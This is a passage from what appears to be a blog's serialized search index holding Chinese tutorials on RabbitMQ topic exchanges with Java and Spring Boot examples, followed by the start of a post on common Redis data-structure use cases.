connection = factory.newConnection();\n\n        // 打开通道\n        Channel channel = connection.createChannel();\n\n        //交换机\n        channel.exchangeDeclare(EXCHANGE_NAME, "topic", true);\n\n        // 申明要消费的队列\n        //创建一个持久化的 不排他的 非自动删除的队列\n        channel.queueDeclare(QUEUE_NAME, true, false, false, null);\n\n        // 绑定队列到交换机\n        channel.queueBind(QUEUE_NAME, EXCHANGE_NAME, "*.orange.*");\n\n        // 这样RabbitMQ就会使得每个Consumer在同一个时间点最多处理一个Message。换句话说，在接收到该Consumer的ack前，他它不会将新的Message分发给它。\n        //mq的公平分发也用到这个\n        channel.basicQos(1);\n\n        // 创建一个回调的消费者处理类\n        com.rabbitmq.client.Consumer consumer = new DefaultConsumer(channel) {\n            @Override\n            public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException {\n                // 接收到的消息\n                String message = new String(body);\n                System.out.println(name + " Received \'" + message + "\'");\n\n                try {\n                    Thread.sleep(sleepTime);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } finally {\n                    System.out.println(name + " 完成： done ");\n                    // false：手动应答\n                    channel.basicAck(envelope.getDeliveryTag(), false);\n                }\n            }\n        };\n\n        // 消费消息 false：手动应答\n        channel.basicConsume(QUEUE_NAME, false, consumer);\n\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n\n\n\n# SpringBoot整合RabbitMQ\n\n> 还是以 topic 为例子\n\n 1. 导入maven依赖\n\n<dependency>\n\t<groupId>org.springframework.boot</groupId>\n\t<artifactId>spring-boot-starter-amqp</artifactId>\n</dependency>\n\n\n1\n2\n3\n4\n\n\n2.修改SpringBoot配置文件application.yml\n\n rabbitmq:\n \thost: localhost # rabbitmq的连接地址\n \tport: 5672 # rabbitmq的连接端口号\n\tvirtual-host: /test # rabbitmq的虚拟host\n\tusername: guest # rabbitmq的用户名\n\tpassword: guest # rabbitmq的密码\n\tpublisher-confirms: true # 如果对异步消息需要回调必须设置为true\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 3. 配置类\n\npackage com.example.rabbitmqdemo.config;\n\nimport org.springframework.amqp.core.Binding;\nimport org.springframework.amqp.core.BindingBuilder;\nimport org.springframework.amqp.core.Queue;\nimport org.springframework.amqp.core.TopicExchange;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\n\n/**\n * @author itguang\n * @create 2018-04-21 16:10\n **/\n@Configuration\npublic class TopicRabbitConfig {\n\n\n    final static String message = "topic.message";\n    final static String messages = "topic.messages";\n\n\n    //创建两个 Queue\n    @Bean\n    public Queue queueMessage(){\n        return new Queue(TopicRabbitConfig.message);\n    }\n\n    @Bean\n    public Queue queueMessages(){\n        return new Queue(TopicRabbitConfig.messages);\n    }\n\n    //配置 TopicExchange,指定名称为 topicExchange\n    @Bean\n    public TopicExchange exchange(){\n        return new TopicExchange("topicExchange");\n    }\n\n    //给队列绑定 exchange 和 routing_key\n\n    @Bean\n    public Binding bindingExchangeMessage(Queue queueMessage, TopicExchange exchange){\n        return BindingBuilder.bind(queueMessage).to(exchange).with("topic.message");\n    }\n\n    @Bean\n    public Binding bingingExchangeMessages(Queue queueMessages,TopicExchange exchange){\n        return BindingBuilder.bind(queueMessages).to(exchange).with("topic.#");\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n 4. 生产者\n\npackage com.example.rabbitmqdemo.topic;\n\nimport org.springframework.amqp.core.AmqpTemplate;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\n\n/**\n * @author itguang\n * @create 2018-04-21 16:26\n **/\n@Component\npublic class TopicSender {\n\n    @Autowired\n    AmqpTemplate amqpTemplate;\n\n    public void send1(){\n        String context = "hi, i am message 1";\n        System.out.println("Sender : " + context);\n        amqpTemplate.convertAndSend("topicExchange","topic.message",context);\n    }\n\n    public void send2() {\n        String context = "hi, i am messages 2";\n        System.out.println("Sender : " + context);\n        amqpTemplate.convertAndSend("topicExchange", "topic.messages", context);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n 5. 2个消费者\n\npackage com.example.rabbitmqdemo.topic;\n\nimport org.springframework.amqp.rabbit.annotation.RabbitHandler;\nimport org.springframework.amqp.rabbit.annotation.RabbitListener;\nimport org.springframework.stereotype.Component;\n\n/**\n * @author itguang\n * @create 2018-04-21 16:34\n **/\n@Component\n@RabbitListener(queues = "topic.message")\npublic class TopicReceiver1 {\n\n    @RabbitHandler\n    public void process(String message){\n\n        System.out.println("Receiver topic.message :"+ message);\n\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\npackage com.example.rabbitmqdemo.topic;\n\nimport org.springframework.amqp.rabbit.annotation.RabbitHandler;\nimport org.springframework.amqp.rabbit.annotation.RabbitListener;\nimport org.springframework.stereotype.Component;\n\n/**\n * @author itguang\n * @create 2018-04-21 16:34\n **/\n@Component\n@RabbitListener(queues = "topic.messages")\npublic class TopicReceiver2 {\n\n    @RabbitHandler\n    public void process(String message){\n\n        System.out.println("Receiver topic.messages: "+ message);\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 其它\n\n * RabbitMQ教程\n * 主题模式\n * SpringBoot整合RabbitMQ\n * 整合RabbitMQ实现延迟消息',normalizedContent:'rabbitmq的5种主题模式、使用场景、在spring、springboot中的使用\n\n\n\n * amqp\n * message queue\n * rabbitmq\n * rabbitmq应用场景\n * rabbitmq的安装（基于docker）\n   * docker环境安装\n   * rabbitmq安装\n * rabbitmq的使用\n   * 九大核心要素\n   * 6种消息队列模型\n * springboot整合rabbitmq\n * 其它\n\n\n\n\n# amqp\n\n * amqp，即advanced message queuing protocol，一个提供统一消息服务的应用层标准高级消息队列协议，是应用层协议的一个开放标准，为面向消息的中间件设计。基于此协议的客户端与消息中间件可传递消息，并不受客户端/中间件不同产品、不同的开发语言等条件的限制。\n\n\n# message queue\n\n * message queue，即消息队列，是一种进程间通信或同一进程的不同线程间的通信方式，软件的贮列用来处理一系列的输入，通常是来自用户。消息队列提供了异步的通信协议，每一个贮列中的纪录包含详细说明的数据，包含发生的时间，输入设备的种类，以及特定的输入参数，也就是说：消息的发送者和接收者不需要同时与消息队列交互。消息会保存在队列中，直到接收者取回它。\n\n\n# rabbitmq\n\n * 官网：http://www.rabbitmq.com/\n\n * rabbitmq是基于erlang语言开发的实现了高级消息队列协议（amqp)的开源消息代理中间件，支持多种语言，多个平台。\n   \n   \n\n\n# rabbitmq应用场景\n\n 1. 异步处理\n 2. 应用解耦\n 3. 流量削峰 -- 传送门\n\n\n# rabbitmq的安装（基于docker）\n\n> 基于windows的安装忽略（注意的就是提前安装对应版本的erlang环境）\n\n\n# docker环境安装\n\n 1. 安装yum-utils：\n\nyum install -y yum -utils device -mapper -persistent -data lvm2\n\n\n1\n\n 2. 为yum源添加docker仓库位置：\n\nyum -config -manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo\n\n\n1\n\n 3. 安装docker：\n\nyum install docker-ce\n\n\n1\n\n 4. 启动docker：\n\nsystemctl start docker\n\n\n1\n\n\n\n# rabbitmq安装\n\n 1. 下载rabbitmq3.7.15的docker镜像：\n\ndocker pull rabbitmq:3.7.15\n\n\n1\n\n 2. 使用docker命令启动：\n\ndocker run -d --name rabbitmq \\\n-p 5672:5672 -p 15672:15672 \\\nrabbitmq:3.7.15\n\n\n1\n2\n3\n\n 3. 进入容器并开启管理功能：\n\ndocker exec -it rabbitmq /bin/bash \nrabbitmq-plugins enable rabbitmq_management\n\n\n1\n2\n\n 4. 开启防火墙：\n\nfirewall-cmd --zone=public --add-port=15672/tcp --permanent\nfirewall-cmd --reload\n\n\n1\n2\n\n 5. 访问地址查看是否安装成功：\n    * http://192.168.3.101:15672/\n    * 默认账号密码均为：guest\n\n\n# rabbitmq的使用\n\n\n# 九大核心要素\n\n名称             释义\nconnection     获取rabbitmq连接，比如一个tcp连接\nchannel        不管是发布消息、订阅队列还是接收消息，这些动作都是通过信道完成。因为对于操作系统来说建立和销毁 tcp\n               都是非常昂贵的开销，所以引入了信道的概念，以复用一条 tcp 连接，amqp 命令都是通过信道发出去的\npublisher      生产者\nmessage        消息体\nexchange       交换器，exchange有4种类型： direct(直接)， fanout(广播), topic(主题),\n               和headers，不同类型的exchange转发消息的策略有所区别\nqueue          消息队列，用来保存消息直到消费者进行消费。\nbinding        绑定，用于消息队列和交换器之间的关联。exchange 和queue的绑定可以是多对多的关系\nconsumer       消费者\nvirtual host   虚拟主机，表示一批交换器、消息队列和相关对象。rabbitmq 默认的 vhost 是 /\n\n\n# 6种消息队列模型\n\n\n\n * 官网是真的真的真的是最好的学习路径：https://www.rabbitmq.com/getstarted.html\n * 官网实例源码rabbitmq-java-maven：https://github.com/rabbitmq/rabbitmq-tutorials/tree/master/java-mvn\n\n# 主题模型\n\n> 这里挑最主要的topic（主题）模型，介绍一下\n\n\n\n举例：如上图的主题模式中，交换机类型设为topic， q1绑定 *.orange.* 路由键，q2绑定两个路由键，分别是 *.*.rabbit 以及 lazy.#\n\n 1. 如果生产者发送路由键为quick.orange.rabbit消息，c1和c2都可以接收到。\n 2. 如果为lazy.orange.elephant， c1和c2都可以接收到\n 3. 如果为quick.orange.fox， 只要c1可以接收到\n 4. 如果为lazy.brown.fox， 只有c2可以接收到\n 5. 如果为lazy.pink.rabbit， c1，c2都可以\n 6. 如果为quick.brown.fox， 都不会接收到\n\ntopic交换机，配置路由键的时候可以配置 *, # 来模糊匹配\n\n 1. * 号表示可以精确匹配一个单词\n 2. # 号可以匹配0个或者多个单词\n\n# 多个消费者公平分发\n\npackage com.zpj.electric.rabbitmq;\n\nimport java.io.ioexception;\n\n/**\n * created by admin on 2019/12/2.\n * 用的是：\n  \t\t<dependency>\n            <groupid>com.rabbitmq</groupid>\n            <artifactid>amqp-client</artifactid>\n            <version>3.0.4</version>\n        </dependency>\n */\npublic class testconsumer {\n    public static void main(string[] args) throws ioexception {\n        //测试公平分发\n        consumer recv1 = new consumer("a",500);\n        recv1.recv_2();\n\n        consumer recv2_2 = new consumer("b",2000);\n        recv2_2.recv_2();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# 生产者\n\npackage com.zpj.electric.rabbitmq;\n\nimport com.rabbitmq.client.channel;\nimport com.rabbitmq.client.connection;\nimport com.rabbitmq.client.connectionfactory;\nimport com.rabbitmq.client.messageproperties;\n\nimport java.io.ioexception;\nimport java.util.concurrent.timeoutexception;\n\npublic class producter {\n\n    private static final string exchange_name = "test_exchange_topic";\n\n    public static void main(string[] args) throws ioexception, timeoutexception {\n        // 获取连接\n        connectionfactory factory = new connectionfactory();\n        factory.sethost("127.0.0.1");\n        factory.setusername("guest");\n        factory.setpassword("guest");\n        factory.setport(5672);\n        connection connection = factory.newconnection();\n        // 从连接开一个通道\n        channel channel = connection.createchannel();\n        // 声明一个topic路由交换机，交换机持久化\n//        channel.exchangedeclare(exchange_name, builtinexchangetype.topic);\n        channel.exchangedeclare(exchange_name, "topic", true);\n\n        // 发送消息\n        string message = "hello, quick.orange.rabbit";\n        /*参数说明：\n            string exchange -- 交换机名称\n        \tstring routingkey -- 路由关键字\n        \tbasicproperties props -- 消息的基本属性，例如路由头等\n        \tbyte[] body -- 消息体\n        */\n        for (int i = 0; i < 100; i++) {\n            message = "hello, quick.orange.rabbit" + "  -------  " + i;\n\n            //参数：交换机名，路由键，消息持久化的，消息体\n            channel.basicpublish(exchange_name, "quick.orange.rabbit", messageproperties.persistent_text_plain, message.getbytes());\n            system.out.println(" [x] sent message : \'" + message + "\'");\n        }\n\n        channel.close();\n        connection.close();\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n\n\n# 消费者\n\npackage com.zpj.electric.rabbitmq;\n\nimport com.rabbitmq.client.*;\n\nimport java.io.ioexception;\n\npublic  class consumer {\n\n    private static final string queue_name = "test_queue_topic_1";\n    private static final string exchange_name = "test_exchange_topic";\n\n    //消费者名称\n    private string name;\n    //休眠时间\n    private int sleeptime;\n\n    public consumer(string name, int sleeptime) {\n        this.name = name;\n        this.sleeptime = sleeptime;\n    }\n\n    public void recv_2() throws ioexception {\n        connectionfactory factory = new connectionfactory();\n        factory.sethost("127.0.0.1");\n        factory.setusername("guest");\n        factory.setpassword("guest");\n        factory.setport(5672);\n        connection connection = factory.newconnection();\n\n        // 打开通道\n        channel channel = connection.createchannel();\n\n        //交换机\n        channel.exchangedeclare(exchange_name, "topic", true);\n\n        // 申明要消费的队列\n        //创建一个持久化的 不排他的 非自动删除的队列\n        channel.queuedeclare(queue_name, true, false, false, null);\n\n        // 绑定队列到交换机\n        channel.queuebind(queue_name, exchange_name, "*.orange.*");\n\n        // 这样rabbitmq就会使得每个consumer在同一个时间点最多处理一个message。换句话说，在接收到该consumer的ack前，他它不会将新的message分发给它。\n        //mq的公平分发也用到这个\n        channel.basicqos(1);\n\n        // 创建一个回调的消费者处理类\n        com.rabbitmq.client.consumer consumer = new defaultconsumer(channel) {\n            @override\n            public void handledelivery(string consumertag, envelope envelope, amqp.basicproperties properties, byte[] body) throws ioexception {\n                // 接收到的消息\n                string message = new string(body);\n                system.out.println(name + " received \'" + message + "\'");\n\n                try {\n                    thread.sleep(sleeptime);\n                } catch (interruptedexception e) {\n                    e.printstacktrace();\n                } finally {\n                    system.out.println(name + " 完成： done ");\n                    // false：手动应答\n                    channel.basicack(envelope.getdeliverytag(), false);\n                }\n            }\n        };\n\n        // 消费消息 false：手动应答\n        channel.basicconsume(queue_name, false, consumer);\n\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n\n\n\n# springboot整合rabbitmq\n\n> 还是以 topic 为例子\n\n 1. 导入maven依赖\n\n<dependency>\n\t<groupid>org.springframework.boot</groupid>\n\t<artifactid>spring-boot-starter-amqp</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n\n\n2.修改springboot配置文件application.yml\n\n rabbitmq:\n \thost: localhost # rabbitmq的连接地址\n \tport: 5672 # rabbitmq的连接端口号\n\tvirtual-host: /test # rabbitmq的虚拟host\n\tusername: guest # rabbitmq的用户名\n\tpassword: guest # rabbitmq的密码\n\tpublisher-confirms: true # 如果对异步消息需要回调必须设置为true\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 3. 配置类\n\npackage com.example.rabbitmqdemo.config;\n\nimport org.springframework.amqp.core.binding;\nimport org.springframework.amqp.core.bindingbuilder;\nimport org.springframework.amqp.core.queue;\nimport org.springframework.amqp.core.topicexchange;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\n/**\n * @author itguang\n * @create 2018-04-21 16:10\n **/\n@configuration\npublic class topicrabbitconfig {\n\n\n    final static string message = "topic.message";\n    final static string messages = "topic.messages";\n\n\n    //创建两个 queue\n    @bean\n    public queue queuemessage(){\n        return new queue(topicrabbitconfig.message);\n    }\n\n    @bean\n    public queue queuemessages(){\n        return new queue(topicrabbitconfig.messages);\n    }\n\n    //配置 topicexchange,指定名称为 topicexchange\n    @bean\n    public topicexchange exchange(){\n        return new topicexchange("topicexchange");\n    }\n\n    //给队列绑定 exchange 和 routing_key\n\n    @bean\n    public binding bindingexchangemessage(queue queuemessage, topicexchange exchange){\n        return bindingbuilder.bind(queuemessage).to(exchange).with("topic.message");\n    }\n\n    @bean\n    public binding bingingexchangemessages(queue queuemessages,topicexchange exchange){\n        return bindingbuilder.bind(queuemessages).to(exchange).with("topic.#");\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n\n 4. 生产者\n\npackage com.example.rabbitmqdemo.topic;\n\nimport org.springframework.amqp.core.amqptemplate;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.stereotype.component;\n\n/**\n * @author itguang\n * @create 2018-04-21 16:26\n **/\n@component\npublic class topicsender {\n\n    @autowired\n    amqptemplate amqptemplate;\n\n    public void send1(){\n        string context = "hi, i am message 1";\n        system.out.println("sender : " + context);\n        amqptemplate.convertandsend("topicexchange","topic.message",context);\n    }\n\n    public void send2() {\n        string context = "hi, i am messages 2";\n        system.out.println("sender : " + context);\n        amqptemplate.convertandsend("topicexchange", "topic.messages", context);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n 5. 2个消费者\n\npackage com.example.rabbitmqdemo.topic;\n\nimport org.springframework.amqp.rabbit.annotation.rabbithandler;\nimport org.springframework.amqp.rabbit.annotation.rabbitlistener;\nimport org.springframework.stereotype.component;\n\n/**\n * @author itguang\n * @create 2018-04-21 16:34\n **/\n@component\n@rabbitlistener(queues = "topic.message")\npublic class topicreceiver1 {\n\n    @rabbithandler\n    public void process(string message){\n\n        system.out.println("receiver topic.message :"+ message);\n\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\npackage com.example.rabbitmqdemo.topic;\n\nimport org.springframework.amqp.rabbit.annotation.rabbithandler;\nimport org.springframework.amqp.rabbit.annotation.rabbitlistener;\nimport org.springframework.stereotype.component;\n\n/**\n * @author itguang\n * @create 2018-04-21 16:34\n **/\n@component\n@rabbitlistener(queues = "topic.messages")\npublic class topicreceiver2 {\n\n    @rabbithandler\n    public void process(string message){\n\n        system.out.println("receiver topic.messages: "+ message);\n\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 其它\n\n * rabbitmq教程\n * 主题模式\n * springboot整合rabbitmq\n * 整合rabbitmq实现延迟消息',charsets:{cjk:!0},lastUpdated:"2024/11/15, 20:41:37",lastUpdatedTimestamp:1731674497e3},{title:"Redis - 常见应用场景",frontmatter:{title:"Redis - 常见应用场景",date:"2021-07-15T00:00:00.000Z",tags:["Redis"],categories:["后端 Back-end"],isShowComments:!1},regularPath:"/views/backend/redis%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF.html",relativePath:"views/backend/redis使用场景.md",key:"v-66d90664",path:"/views/backend/redis%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF.html",headers:[{level:2,title:"一、String 场景",slug:"一、string-场景",normalizedTitle:"一、string 场景",charIndex:3},{level:2,title:"二、Hash 场景",slug:"二、hash-场景",normalizedTitle:"二、hash 场景",charIndex:18},{level:2,title:"三、List 场景",slug:"三、list-场景",normalizedTitle:"三、list 场景",charIndex:31},{level:2,title:"四、Set 场景",slug:"四、set-场景",normalizedTitle:"四、set 场景",charIndex:44},{level:2,title:"五、zSet 场景",slug:"五、zset-场景",normalizedTitle:"五、zset 场景",charIndex:56},{level:2,title:"五、bitmap 场景",slug:"五、bitmap-场景",normalizedTitle:"五、bitmap 场景",charIndex:69}],headersStr:"一、String 场景 二、Hash 场景 三、List 场景 四、Set 场景 五、zSet 场景 五、bitmap 场景",content:" * 一、String 场景\n * 二、Hash 场景\n * 三、List 场景\n * 四、Set 场景\n * 五、zSet 场景\n * 五、bitmap 场景\n\n\n\nRedis是一个key-value存储系统，现在在各种系统中的使用越来越多，大部分情况下是因为其高性能的特性，被当做缓存使用，下面介绍下Redis经常遇到的使用场景。\n\n\n# 一、String 场景\n\n * 计数：例如掘金文章点击数量，阅读数量。\n * 缓存：MySQL 缓存。\n * session共享：集群环境下的 session 共享。\n * 限流：限制一个公共API下某个用户每秒只能调用100次。 set设置key为userId:api，value为次数，过期时间为1s。(1s内每次调用则value加1)\n\n\n# 二、Hash 场景\n\n各种 商城购物车 (淘宝，京东。。)\n\n设计思路：\n\n1.购物车绑定了 userId。\n\n2.商品id作为feild，商品数量作为value。\n\n模拟过程：\n\n// 初始化购物车数据\nhmset userId:1 prod:1 1 prod:2 3 prod:3 4\n\n// 增加商品 prod:1 购买数量为2件时\nhincrby userId:1 prod:1 1\n\n// 减少商品 prod:2 数量为1件时\nhincrby userId:1 prod:2 -2\n\n// 删除商品 prod:1 时\nhdel userId:1 prod:1\n\n// 统计商品数\nhlen userId:1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 三、List 场景\n\n微信公众号订阅消息，文章评论列表等等\n\n设计思路：\n\n公众号发布消息时，向订阅本公众号的用户(mess:1)推送(将订阅消息id通过lpush放入用户的list中)，模拟过程。\n\n模拟过程：\n\n// 推送消息\nlpush mess:1 999\nlpush mess:1 1000\nlpush mess:1 1010\n\n// 查看消息，返回结果1010 1000 999\nlrange mess:1 0 -1\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 四、Set 场景\n\n限时抽奖活动：例如微信有个活动，活动id为2，如何基于Redis设计实现。\n\n设计思路：\n\n用户点击立即参与后，将用户id保存到活动id的集合中，利用Set集合的元素唯一性可查看参加用户、参加用户数量等等。\n\n模拟过程：\n\n// 用户user:1 user:2 user:3参加抽奖活动act:888\nsadd act:888 user:1 user:2 user:3\n\n// 模拟一次性随机抽奖1名【抽奖】\nsrandmember act:888\n\n// 模拟两次抽奖，两次抽奖不重复，使用spop命令，抽取中的用户会从set中移除\nspop act:888\nspop act:888\n    \n/* 好友关系：共同关注，我关注的人也关注了他，我可能认识的人\n    注： 如果数据量大的情况下使用大数据分析\n    设计思路：两个集合取交集\n    模拟过程：*/\n    \n// 三个用户关注的人\nsadd user:1 zhangsan lisi wangwu\nsadd user:2 zhangsan liliu wanger wangwu\nsadd user:3 list wangwu liliu\n\n// user:1和user:2共同关注的人，【取交集】\n// 返回zhangsan wangwu\nsinter user:1 user:2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 五、zSet 场景\n\n各种榜单：\n\n例如百度新闻排名\n\n设计思路：\n\n将新闻id作为member，点击次数设置为score，每点击一次score+1，当然，为了每日榜单，member在设计时可以加上后缀用于日期区分，例如news:20191216、news:20191217 。\n\n模拟过程：\n\n// 增加热点新闻\nzadd topic:20191216 100 new:1 200 new:2 150 new:3 500 new:4\n\n// new:1点击了120次，点击数变为220\nzincrby topic:20191216 120 new:1\n\n// 查看今日排行前3名，返回 new:4 500 new:1 220 new:2 200\nzrevrange topic:20191216 0 2 withscores\n\n// 1.新添加数据\nzadd topic:20191217 110 new:1 200 new:2 150 new:3 100 new:4\n\nzadd topic:20191218 110 new:5 200 new:2 150 new:6 100 new:7\n\n// 2.合并三日的数据\nzunionstore topic:3day 3 topic:20191216 topic:20191217 topic:201912168\n\n// 3.查看近三日排行榜前三名，返回new:4 600 new:2 600 new:1 330\nzrevrange topic:3day 0 2 withscores\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 五、bitmap 场景\n\n如何用redis存储统计1亿用户一年的登陆情况，并快速检索任意时间窗口内的活跃用户数量？redis如何做亿级用户登录日活统计？\n\n利用redis的bitmap，value是一个二进制数据，每一位只能是0或者1。\n\n// setbit key offset value\n// 用户登录，用户id为整型\nsetbit login:20220505 uid 1\n        \n// 判断用户某日是否登录过\ngetbit login:20220505 uid\n        \n// 每日用户登录数量统计 bitcount key [start] [end]\nbitcount login:20220505\n\n// 活跃用户(连续三日登录)统计 bitop operation destkey key [key …]\n/* bitmap的bitop命令支持对bitmap进行AND(与)，(OR)或，XOR(亦或)，NOT(非)四种相关操作;\n    我们对近三日的bitmap做AND操作即可，操作之后会形成一个新的bitmap，\n    我们可以取名为login:top_count \n */\n/* 然后我们可以对login:top_count使用bitcount或者getbit命令，\n    用于统计活跃用户数量，或者查看某个用户是否为活跃用户\n */\nbitop and login:top_count login:20201005 login:20201004 login:20201003\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n以上就是了解Redis常见应用场景的详细内容。",normalizedContent:" * 一、string 场景\n * 二、hash 场景\n * 三、list 场景\n * 四、set 场景\n * 五、zset 场景\n * 五、bitmap 场景\n\n\n\nredis是一个key-value存储系统，现在在各种系统中的使用越来越多，大部分情况下是因为其高性能的特性，被当做缓存使用，下面介绍下redis经常遇到的使用场景。\n\n\n# 一、string 场景\n\n * 计数：例如掘金文章点击数量，阅读数量。\n * 缓存：mysql 缓存。\n * session共享：集群环境下的 session 共享。\n * 限流：限制一个公共api下某个用户每秒只能调用100次。 set设置key为userid:api，value为次数，过期时间为1s。(1s内每次调用则value加1)\n\n\n# 二、hash 场景\n\n各种 商城购物车 (淘宝，京东。。)\n\n设计思路：\n\n1.购物车绑定了 userid。\n\n2.商品id作为feild，商品数量作为value。\n\n模拟过程：\n\n// 初始化购物车数据\nhmset userid:1 prod:1 1 prod:2 3 prod:3 4\n\n// 增加商品 prod:1 购买数量为2件时\nhincrby userid:1 prod:1 1\n\n// 减少商品 prod:2 数量为1件时\nhincrby userid:1 prod:2 -2\n\n// 删除商品 prod:1 时\nhdel userid:1 prod:1\n\n// 统计商品数\nhlen userid:1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 三、list 场景\n\n微信公众号订阅消息，文章评论列表等等\n\n设计思路：\n\n公众号发布消息时，向订阅本公众号的用户(mess:1)推送(将订阅消息id通过lpush放入用户的list中)，模拟过程。\n\n模拟过程：\n\n// 推送消息\nlpush mess:1 999\nlpush mess:1 1000\nlpush mess:1 1010\n\n// 查看消息，返回结果1010 1000 999\nlrange mess:1 0 -1\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 四、set 场景\n\n限时抽奖活动：例如微信有个活动，活动id为2，如何基于redis设计实现。\n\n设计思路：\n\n用户点击立即参与后，将用户id保存到活动id的集合中，利用set集合的元素唯一性可查看参加用户、参加用户数量等等。\n\n模拟过程：\n\n// 用户user:1 user:2 user:3参加抽奖活动act:888\nsadd act:888 user:1 user:2 user:3\n\n// 模拟一次性随机抽奖1名【抽奖】\nsrandmember act:888\n\n// 模拟两次抽奖，两次抽奖不重复，使用spop命令，抽取中的用户会从set中移除\nspop act:888\nspop act:888\n    \n/* 好友关系：共同关注，我关注的人也关注了他，我可能认识的人\n    注： 如果数据量大的情况下使用大数据分析\n    设计思路：两个集合取交集\n    模拟过程：*/\n    \n// 三个用户关注的人\nsadd user:1 zhangsan lisi wangwu\nsadd user:2 zhangsan liliu wanger wangwu\nsadd user:3 list wangwu liliu\n\n// user:1和user:2共同关注的人，【取交集】\n// 返回zhangsan wangwu\nsinter user:1 user:2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 五、zset 场景\n\n各种榜单：\n\n例如百度新闻排名\n\n设计思路：\n\n将新闻id作为member，点击次数设置为score，每点击一次score+1，当然，为了每日榜单，member在设计时可以加上后缀用于日期区分，例如news:20191216、news:20191217 。\n\n模拟过程：\n\n// 增加热点新闻\nzadd topic:20191216 100 new:1 200 new:2 150 new:3 500 new:4\n\n// new:1点击了120次，点击数变为220\nzincrby topic:20191216 120 new:1\n\n// 查看今日排行前3名，返回 new:4 500 new:1 220 new:2 200\nzrevrange topic:20191216 0 2 withscores\n\n// 1.新添加数据\nzadd topic:20191217 110 new:1 200 new:2 150 new:3 100 new:4\n\nzadd topic:20191218 110 new:5 200 new:2 150 new:6 100 new:7\n\n// 2.合并三日的数据\nzunionstore topic:3day 3 topic:20191216 topic:20191217 topic:201912168\n\n// 3.查看近三日排行榜前三名，返回new:4 600 new:2 600 new:1 330\nzrevrange topic:3day 0 2 